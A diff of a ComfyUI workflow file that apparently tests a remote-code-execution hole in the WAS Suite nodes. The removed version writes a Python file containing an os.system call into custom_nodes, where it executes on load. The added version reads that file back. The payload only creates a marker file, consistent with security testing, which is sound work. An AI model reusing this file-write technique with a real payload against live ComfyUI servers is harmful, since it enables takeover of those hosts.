@@ -1,22 +1,18 @@
 {
   "1": {
-    "class_type": "easy string",
+    "class_type": "Load Text File",
     "inputs": {
-      "value": "# RCE via WAS Suite\nimport os\nos.system(\"touch /tmp/was_suite_rce_proof\")\nNODE_CLASS_MAPPINGS = {}\n"
+      "file_path": "/ComfyUI/custom_nodes/was-rce-test/__init__0.py",
+      "dictionary_name": "test"
     }
   },
   "2": {
-    "class_type": "Save Text File",
+    "class_type": "easy showAnything",
     "inputs": {
-      "text": [
+      "anything": [
         "1",
         0
-      ],
-      "path": "/ComfyUI/custom_nodes/was-rce-test",
-      "filename_prefix": "__init__",
-      "filename_delimiter": "",
-      "filename_number_padding": 0,
-      "file_extension": ".py"
+      ]
     }
   }
 }
